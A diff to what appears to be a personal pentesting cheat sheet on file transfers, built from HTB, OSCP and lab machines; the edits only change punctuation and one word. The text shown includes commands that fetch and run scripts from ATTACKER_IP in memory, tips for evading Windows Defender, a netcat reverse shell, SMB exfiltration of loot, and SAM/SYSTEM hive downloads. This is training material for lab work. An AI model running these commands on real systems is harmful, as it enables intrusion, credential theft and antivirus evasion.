@@ -1,6 +1,6 @@
 # File Transfers
 
-Comprehensive reference organized by situation. See also [[Reverse-Shells]] for getting shells after transfer.
+full reference organized by situation. See also [[Reverse-Shells]] for getting shells after transfer.
 
 ---
 
@@ -124,35 +124,35 @@ copy C:\file \\ATTACKER_IP\share\
 ## Tips
 
 - Always `chmod +x` after transferring binaries on Linux
-- **`C:\tmp` doesn't exist by default** — use `mkdir C:\tmp` first, or use `C:\Windows\Temp` or `C:\Users\Public`
+- **`C:\tmp` doesn't exist by default** - use `mkdir C:\tmp` first, or use `C:\Windows\Temp` or `C:\Users\Public`
 - `/tmp` exists on all Linux boxes, `/dev/shm` is another option (tmpfs, no disk write)
-- SMB is usually the cleanest for Windows — no files written to temp
+- SMB is usually the cleanest for Windows - no files written to temp
 - If all else fails: base64 encode, copy-paste through shell, decode
 - **If transfer hangs**: firewall may block outbound. Try ports 80, 443, or 53
-- `python3 -m http.server 80` requires root (port <1024) — use `sudo` or pick port 8000+
-- **Windows Defender may quarantine your uploads** — try renaming (nc.exe → n.exe), packing, or using PowerShell in-memory execution:
+- `python3 -m http.server 80` requires root (port <1024) - use `sudo` or pick port 8000+
+- **Windows Defender may quarantine your uploads** - try renaming (nc.exe → n.exe), packing, or using PowerShell in-memory execution:
 ```powershell
 IEX(IWR http://ATTACKER_IP/script.ps1 -UseBasicParsing)
 ```
 
 ## From Your Boxes
 
-> **Buff** (HTB) — SMB share for transferring nc binary when web shell had restricted commands
+> **Buff** (HTB) - SMB share for transferring nc binary when web shell had restricted commands
 > - What worked: `impacket-smbserver -smb2support newShare . -username test -password test` on Kali, then from webshell: `net use z: \\TARGET_IP\newShare /u:test test` and `copy z:\nc64.exe .`
 > - Lesson: When you have RCE but wget/curl/certutil don't work, SMB share is the most reliable Windows transfer method
 
-> **Lab AD chain** (personal lab) — certutil blocked by permissions, had to use evil-winrm download instead
+> **Lab AD chain** (personal lab) - certutil blocked by permissions, had to use evil-winrm download instead
 > - What worked: evil-winrm's built-in `download C:\windows.old\Windows\System32\SAM` and `download C:\windows.old\Windows\System32\SYSTEM`
 > - Lesson: certutil can be blocked by AppLocker/permissions. evil-winrm has built-in upload/download that bypasses this
 
-> **Berlin** (Course/OSCP B) — wget and curl for transferring chisel binary and msfvenom ELF payload
+> **Berlin** (Course/OSCP B) - wget and curl for transferring chisel binary and msfvenom ELF payload
 > - What worked: `curl http://ATTACKER_IP/shell.elf --output /tmp/shell.elf` then `chmod +x /tmp/shell.elf`
 > - Lesson: Always use `/tmp` on Linux targets and `chmod +x` after transfer. Start your HTTP server before running the download command
 
-> **Forest** (HTB) — SMB share + PowerShell for transferring SharpHound and BloodHound output
+> **Forest** (HTB) - SMB share + PowerShell for transferring SharpHound and BloodHound output
 > - What worked: `smbserver.py share . -smb2support -username df -password df` on Kali, then `net use \\TARGET_IP\share /u:df df` and `copy file \\TARGET_IP\share\` on target
-> - Lesson: SMB is bidirectional — use it for both uploading tools AND exfiltrating loot
+> - Lesson: SMB is bidirectional - use it for both uploading tools AND exfiltrating loot
 
-> **Cockpit** (PG/Linux) — wget for downloading a custom nc binary when system nc lacked -e flag
+> **Cockpit** (PG/Linux) - wget for downloading a custom nc binary when system nc lacked -e flag
 > - What worked: `wget http://ATTACKER_IP/nc` then `chmod +x nc` then `./nc ATTACKER_IP 9090 -e /bin/bash`
 > - Lesson: If target's nc doesn't support -e, upload a netcat binary from github.com/H74N/netcat-binaries that does
